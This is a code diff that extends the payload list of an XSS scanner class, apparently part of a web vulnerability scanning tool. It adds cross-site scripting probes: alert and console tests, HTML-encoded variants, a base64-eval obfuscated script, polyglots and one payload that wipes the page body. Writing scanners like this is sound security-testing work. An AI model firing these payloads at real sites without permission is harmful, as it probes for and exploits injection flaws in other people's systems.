@@ -12,13 +12,43 @@ class XSSScanner(BaseScanner):
             """<script>Toastify({text:"XSS Test",duration:3000}).showToast();</script>""",
             """<img src=x onerror="Toastify({text:'XSS Found',className:'toast-error'}).showToast()">""",
             """<svg onload="Toastify({text:'XSS Success',className:'toast-success'}).showToast()">""",
+            
             # Console-based detection
             """<script>console.log('XSS Test')</script>""",
             """<img src=x onerror="console.log('XSS Found')">""",
+            
             # Detection markers
             """<xss id="test"></xss>""",
             """javascript:console.log('XSS')""",
             """'onmouseover="console.log('XSS')" t='""",
+            
+            # Advanced XSS Payloads
+            """<script>alert('XSS')</script>""",
+            """<img src="x" onerror="alert('XSS')">""",
+            """<svg/onload=alert('XSS')>""",
+            """<iframe src="javascript:alert('XSS')"></iframe>""",
+            """<input type="text" value="XSS" onfocus="alert('XSS')">""",
+            
+            # HTML Encoding Variants
+            """&#60;script&#62;alert('XSS')&#60;/script&#62;""",
+            """&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;""",
+            
+            # Event Handlers
+            """<div onmouseover="alert('XSS')">Hover me</div>""",
+            """<img src=x onerror="document.body.innerHTML=''">""",
+            
+            # DOM-based XSS
+            """javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[/+/id=`alert(1)`/]+'>""",
+            
+            # Obfuscated XSS
+            """<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>""",
+            
+            # Polyglot XSS
+            """javascript:'/*\"/*`/*' /*</stript><html><body><svg/onload='+/"/+/onmouseover=1/+/[*/[/+/id=`alert(1)`/]+'>""",
+            
+            # Exotic Payloads
+            """<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;1)>""",
+            """<details open ontoggle=alert('XSS')>"""
         ]
 
     def scan(self) -> Dict:
